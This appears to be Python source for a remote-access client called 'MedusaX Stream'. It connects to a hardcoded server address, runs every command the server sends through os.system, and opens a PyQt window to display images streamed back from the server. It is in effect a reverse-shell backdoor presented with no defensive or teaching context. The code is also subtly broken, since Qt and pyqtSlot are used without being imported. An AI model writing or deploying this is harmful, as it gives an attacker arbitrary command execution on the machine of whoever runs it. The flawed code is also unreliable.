import socket
import threading
import os
import sys
from PyQt5.QtWidgets import QApplication, QMainWindow, QLabel, QVBoxLayout, QWidget
from PyQt5.QtGui import QImage, QPixmap
from PyQt5.QtCore import QThread, pyqtSignal
import cv2
import numpy as np

SERVER_IP = "10.0.1.33"
SERVER_PORT = 9999

class StreamThread(QThread):
    change_pixmap_signal = pyqtSignal(QImage)

    def __init__(self, conn):
        super().__init__()
        self.conn = conn

    def run(self):
        while True:
            try:
                length = self.conn.recv(16).decode()
                if length:
                    stringData = self.conn.recv(int(length))
                    data = np.frombuffer(stringData, dtype='uint8')
                    image = cv2.imdecode(data, 1)
                    rgb_image = cv2.cvtColor(image, cv2.COLOR_BGR2RGB)
                    h, w, ch = rgb_image.shape
                    bytes_per_line = ch * w
                    convert_to_qt_format = QImage(rgb_image.data, w, h, bytes_per_line, QImage.Format_RGB888)
                    p = convert_to_qt_format.scaled(640, 480, Qt.KeepAspectRatio)
                    self.change_pixmap_signal.emit(p)
            except:
                break

class MainWindow(QMainWindow):
    def __init__(self):
        super().__init__()
        self.setWindowTitle("MedusaX Stream")
        self.setGeometry(100, 100, 800, 600)
        self.image_label = QLabel(self)
        self.setCentralWidget(self.image_label)

    @pyqtSlot(QImage)
    def set_image(self, image):
        self.image_label.setPixmap(QPixmap.fromImage(image))

def handle_server_commands(conn):
    while True:
        command = conn.recv(1024).decode()
        if command.startswith("!stream"):
            app = QApplication(sys.argv)
            main_window = MainWindow()
            main_window.show()
            stream_thread = StreamThread(conn)
            stream_thread.change_pixmap_signal.connect(main_window.set_image)
            stream_thread.start()
            sys.exit(app.exec_())
        else:
            os.system(command)

def start_client():
    conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    conn.connect((SERVER_IP, SERVER_PORT))
    print("[*] Connected to server")

    command_thread = threading.Thread(target=handle_server_commands, args=(conn,))
    command_thread.start()

if __name__ == "__main__":
    start_client()
